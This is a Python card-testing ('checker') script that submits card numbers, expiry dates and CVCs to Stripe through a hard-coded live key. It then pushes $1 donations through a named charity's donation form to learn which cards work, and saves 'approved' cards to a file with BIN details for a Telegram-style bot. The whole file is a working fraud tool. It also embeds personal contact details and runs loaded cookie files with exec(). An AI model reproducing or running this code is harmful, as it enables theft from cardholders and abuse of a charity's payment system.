import requests
from bs4 import BeautifulSoup
import time
from p import get_bin_info  # p.py से BIN इन्फो के लिए

session = requests.Session()

# Global headers
stripe_headers = {
    'authority': 'api.stripe.com',
    'accept': 'application/json',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://js.stripe.com',
    'referer': 'https://js.stripe.com/',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10)',
}

donation_headers = {
    'authority': 'needhelped.com',
    'accept': 'application/json, text/javascript, */*; q=0.01',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'origin': 'https://needhelped.com',
    'referer': 'https://needhelped.com/campaigns/christmas-poor-family-need-help-for-mother-teresas-charity/donate/',
    'user-agent': 'Mozilla/5.0 (X11; Linux x86_64)',
    'x-requested-with': 'XMLHttpRequest',
}

def load_cookies(filename):
    try:
        with open(filename, 'r') as f:
            content = f.read()
            namespace = {}
            exec(content, namespace)
            return namespace['cookies']
    except Exception as e:
        print(f"Error reading {filename}: {str(e)}")
        return {}

# कुकीज लोड करें (cookies_stripe.txt अगर है तो)
session.cookies.update(load_cookies('cookies_stripe.txt'))

def get_nonce():
    res = session.get("https://needhelped.com/campaigns/christmas-poor-family-need-help-for-mother-teresas-charity/donate/", headers=donation_headers)
    soup = BeautifulSoup(res.text, "html.parser")
    try:
        return soup.find('input', {'name': '_charitable_donation_nonce'}).get('value')
    except:
        return None

def Tele(ccx):
    start_time = time.time()
    try:
        n, mm, yy, cvc = ccx.strip().split("|")
        if "20" in yy:
            yy = yy.split("20")[1]

        stripe_data = f"type=card&billing_details[name]=Arhan+verma&billing_details[email]=Arhan911man%40gmail.com&billing_details[address][city]=New+York&billing_details[address][country]=US&billing_details[address][line1]=Main+Street&billing_details[address][postal_code]=10080&billing_details[address][state]=NY&billing_details[phone]=2747548742&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&key=pk_live_51NKtwILNTDFOlDwVRB3lpHRqBTXxbtZln3LM6TrNdKCYRmUuui6QwNFhDXwjF1FWDhr5BfsPvoCbAKlyP6Hv7ZIz00yKzos8Lr"

        res1 = session.post("https://api.stripe.com/v1/payment_methods", headers=stripe_headers, data=stripe_data)
        pm_id = res1.json().get("id")
        if not pm_id:
            elapsed_time = time.time() - start_time
            return f"""
❌ Declined
⌬ 𝗖𝗖 ⇾ {ccx}
𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Stripe
𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ Stripe Error: {res1.text}

𝗧𝗼𝗼𝗸 {elapsed_time:.2f} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀

⌬ 𝗕𝗼𝘁 𝗯𝘆 : @BlinkOP28
"""

        nonce = get_nonce()
        if not nonce:
            elapsed_time = time.time() - start_time
            return f"""
❌ Declined

𝗖𝗖 ⇾ {ccx}
𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Stripe
𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ Failed to fetch nonce

𝗧𝗼𝗼𝗸 {elapsed_time:.2f} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀

 ⌬ 𝗕𝗼𝘁 𝗯𝘆 : @BlinkOP28
"""

        donation_data = {
            'charitable_form_id': '675e79411a82a',
            '675e79411a82a': '',
            '_charitable_donation_nonce': nonce,
            '_wp_http_referer': '/campaigns/christmas-poor-family-need-help-for-mother-teresas-charity/donate/',
            'campaign_id': '1164',
            'description': 'Donation',
            'ID': '0',
            'donation_amount': 'custom',
            'custom_donation_amount': '1.00',
            'first_name': 'Arhan',
            'last_name': 'verma',
            'email': 'arhan911man@gmail.com',
            'address': '116 Jennifer Haven Apt. 225',
            'address_2': '',
            'city': 'New York',
            'state': 'NY',
            'postcode': '10080',
            'country': 'US',
            'phone': '2747548742',
            'gateway': 'stripe',
            'stripe_payment_method': pm_id,
            'action': 'make_donation',
            'form_action': 'make_donation',
        }

        res2 = session.post("https://needhelped.com/wp-admin/admin-ajax.php", headers=donation_headers, data=donation_data)
        elapsed_time = time.time() - start_time
        bin_info = get_bin_info(n[:6]) or {}

        try:
            json_data = res2.json()
            if 'errors' in json_data:
                return f"""
❌ Declined

𝗖𝗖 ⇾ {ccx}
𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Stripe
𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ {json_data['errors']}

𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info.get('brand', 'UNKNOWN')} - {bin_info.get('type', 'UNKNOWN')} - {bin_info.get('level', 'UNKNOWN')}
𝗕𝗮𝗻𝗸: {bin_info.get('bank', 'UNKNOWN')}
𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_info.get('country', 'UNKNOWN')} {bin_info.get('emoji', '🏳️')}

𝗧𝗼𝗼𝗸 {elapsed_time:.2f} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀

 ⌬ 𝗕𝗼𝘁 𝗯𝘆 : @BlinkOP28
"""
            else:
                with open('approved_stripe.txt', 'a', encoding='utf-8') as approved_file:
                    approved_file.write(f"""
=========================
[APPROVED]

𝗖𝗖 ⇾ {ccx}
𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Stripe
𝙍𝙚𝙨𝙥𝙤𝙣𝙨𝙚  ⇾Approved 

𝘽𝙞𝙣 𝙄𝙣𝙛𝙤: {bin_info.get('brand', 'UNKNOWN')} - {bin_info.get('type', 'UNKNOWN')} - {bin_info.get('level', 'UNKNOWN')}
𝗕𝗮𝗻𝗸: {bin_info.get('bank', 'UNKNOWN')}
𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_info.get('country', 'UNKNOWN')} {bin_info.get('emoji', '🏳️')}

𝗧𝗼𝗼𝗸 {elapsed_time:.2f} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀

𝗕𝗼𝘁 𝗯𝘆 : @BlinkOP28
=========================
\n\n""")
                return f"""
✅ Successful

𝗖𝗖 ⇾ {ccx}
𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Stripe
𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ Thanks For Donation Charge 1 Doller ✅

𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info.get('brand', 'UNKNOWN')} - {bin_info.get('type', 'UNKNOWN')} - {bin_info.get('level', 'UNKNOWN')}
𝗕𝗮𝗻𝗸: {bin_info.get('bank', 'UNKNOWN')}
𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_info.get('country', 'UNKNOWN')} {bin_info.get('emoji', '🏳️')}

𝗧𝗼𝗼𝗸 {elapsed_time:.2f} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀

𝗕𝗼𝘁 𝗯𝘆 : @BlinkOP28
"""
        except:
            return f"""
❌ Declined

𝗖𝗖 ⇾ {ccx}
𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Stripe
𝙍𝙚𝙨𝙥𝙤𝙣𝙨𝙚  ⇾ Unknown Response: {res2.text}

𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info.get('brand', 'UNKNOWN')} - {bin_info.get('type', 'UNKNOWN')} - {bin_info.get('level', 'UNKNOWN')}
𝗕𝗮𝗻𝗸: {bin_info.get('bank', 'UNKNOWN')}
𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_info.get('country', 'UNKNOWN')} {bin_info.get('emoji', '🏳️')}

𝗧𝗼𝗼𝗸 {elapsed_time:.2f} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀

𝗕𝗼𝘁 𝗯𝘆 : @BlinkOP28
"""
    except Exception as e:
        elapsed_time = time.time() - start_time
        return f"""
❌ Declined

𝗖𝗖 ⇾ {ccx}
𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Stripe
𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ Error: {str(e)}

𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info.get('brand', 'UNKNOWN')} - {bin_info.get('type', 'UNKNOWN')} - {bin_info.get('level', 'UNKNOWN')}
𝗕𝗮𝗻𝗸: {bin_info.get('bank', 'UNKNOWN')}
𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_info.get('country', 'UNKNOWN')} {bin_info.get('emoji', '🏳️')}

 T𝗼𝗼𝗸 {elapsed_time:.2f} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀

𝗕𝗼𝘁 𝗯𝘆 : @BlinkOP28
"""